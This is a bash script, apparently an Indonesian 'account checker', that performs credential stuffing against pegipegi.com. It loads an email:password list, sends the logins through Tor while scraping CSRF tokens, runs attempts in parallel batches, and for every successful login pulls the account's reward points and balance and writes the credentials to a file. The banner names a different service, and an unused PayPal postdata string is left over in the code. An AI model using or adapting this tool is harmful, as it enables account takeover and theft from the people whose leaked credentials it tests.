#!/bin/bash
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
LIGHTGREEN="\e[92m"
MARGENTA="\e[35m"
BLUE="\e[34m"
BOLD="\e[1m"
NOCOLOR="\e[0m"
PUTIH='\033[1;37m'
labelmerah='\e[41m'
labelijo='\e[42m'
labelkuning='\e[43m'
echo -e "\e[38;5;206m"
echo -e "\e[1m"
cat << "EOF"
   ---------------------------------------------------------
    o   o     o
     \ /      |
      O    oo o  o o-o  o-o -o-
     / \  | | |  | |  | |-'  |
    o   o o-o-o--O o  o o-o  o
       |
         o--o / Deatchbycaptcha Account Checker
         Rewrite: mtezy
         
   ---------------------------------------------------------
 
EOF
 
printf "\e[38;5;50m"
cat << "thanks"
    Thanks : Extreme Crew - ccoocoot ccoocot
   XAYNET - SGBTeam - Rumah Sakit Jiwa
   
   
thanks

ngecek() {
    res1=$(date +%s)
    start_date=$(date +%H:%M:%S)
    username=$(echo ${1} | cut -d@ -f1)
    extract=$(echo ${2} | awk '{ print tolower($0); }')
    postdata="button[country_code]=US&button[type]=DONATE&button[sub_type]=PRODUCTS&button[language]=en&button[button_variables][0][name]=item_name&button[button_variables][0][value]=&button[button_variables][1][name]=currency_code&button[button_variables][1][value]=USD&button[button_variables][2][name]=business&button[button_variables][2][value]=${1}&button[button_variables][3][name]=item_number&button[button_variables][3][value]=&button[button_variables][4][name]=no_shipping&button[button_variables][4][value]=1&button[button_variables][5][name]=no_note&button[button_variables][5][value]=0&button[button_image_url]=https%3A%2F%2Fwww.paypalobjects.com%2Fen_US%2Fi%2Fbtn%2Fbtn_donateCC_LG.gif&button[button_image]=CC"
	authPage=$(curl -s --socks5 127.0.0.1:9050 "https://serviceauth.pegipegi.com/login" -i \
	-H "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7" \
	-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")
#  auth=$(echo "$setCok" | grep __VIEWSTATE | sort -u | grep -Po '(?<=value=")[^"]*' | sed -e '/^CA0B0334/,/^CA0B0334/d')
 # jancuk=$(echo "$setCok" | grep HiddenField2 | grep -Po '(?<=value=")[^"]*')
  setCok=$(echo $authPage | grep -Po '(?<=authservice=)[^;]*')
  token=$(echo $authPage | grep csrf-sso | grep -Po '(?<=value=")[^"]*' | head -n1)
  auth=$(echo $authPage | grep csrf-sso | grep -Po '(?<=value=")[^"]*')
  auths=( $auth )
  gasLogin=$(curl -s -i --socks5 127.0.0.1:9050 "https://serviceauth.pegipegi.com/login" -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: https://serviceauth.pegipegi.com/login?resource=sp_main_homepage&redirect=https://www.pegipegi.com" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36" \
  -H "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7" \
  -H "Cookie: authservice=${setCok}" \
  -H "Sec-Fetch-Site: same-origin" \
  -H "Origin: https://serviceauth.pegipegi.com" \
  -d "_token=${token}&csrf-sso=${auths[1]}&email=${1}&password=${2}")
  setcookie=$(echo $gasLogin | grep -Po '(?<=Set-Cookie:)[^;]*')
  if [[ $setcookie == *"sso"* ]]; then
  sso=$(echo "$setcookie" | grep -Po '(?<=sso=)[^;]*')
  phpses=$(echo "$setcookie" | grep -Po '(?<=phpsess=)[^;]*')
  getReward=$(curl -s --socks5 127.0.0.1:9050 "https://serviceauth.pegipegi.com/account/profile/reward" -X GET \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36" \
  -H "Cookie: sso=${sso}; phpsess=${phpses}; authservice=${setCok}")
  totalpoint=$(echo "$getReward" | sed -e 's/<[^>]*>//g' | grep -Po '(?<=Total Point Anda : )[^"]*' | tr -d '()')
  reward=$(echo $totalpoint | grep -Po "(?<=Rp )[^ ]*")
  printf "${NOCOLOR}[$i/$totalLines]${GREEN} [ $1/$2 ] ${NOCOLOR} ${labelmerah}INFO:${BOLD}${NOCOLOR} Total Point dan Saldo = ${GREEN}$totalpoint${NOCOLOR}\n"
  echo "$1/$2 INFO: Total Point dan Saldo = $totalpoint" >> pegipegi.txt
  else
  printf "${NOCOLOR}[$i/$totalLines]${labelmerah} [ $1/$2 ] ${NOCOLOR} \n"
  fi
  
}  
	

echo "List In This Directory : "
echo "Delimeter list -> email:password "
echo -n "Masukan File List : "
    read list
    echo "[+] Calculate your mailist file"
    echo "############################"
    totalLines=`grep -c ":" $list`
    echo "There are $totalLines of list."
    echo "############################"
    if [ ! -f $list ]; then
echo "$list No Such File"
    exit
    fi
    x=$(gawk -F: '{ print $1 }' $list)
    y=$(gawk -F: '{ print $2 }' $list)
    persend=50
    setleep=5
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'emailgblg=($x)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwordna=($y)'
    for (( i = 0; i < "${#emailgblg[@]}"; i++ )); do
    index=$((itung++))
    if [[ $(expr ${i} % ${itung}) == 0 && $i > 0 ]]; then
    percentage=$((100*$i/$totalLines))
    wait
    printf "SLEEP ${setleep}s\n"
    sleep $setleep
    fi
   emailna="${emailgblg[$i]}"
   kontol="${passwordna[$i]}"
   

   ngecek "$emailna" "${kontol}" "${index}" &
    done
    wait
    
    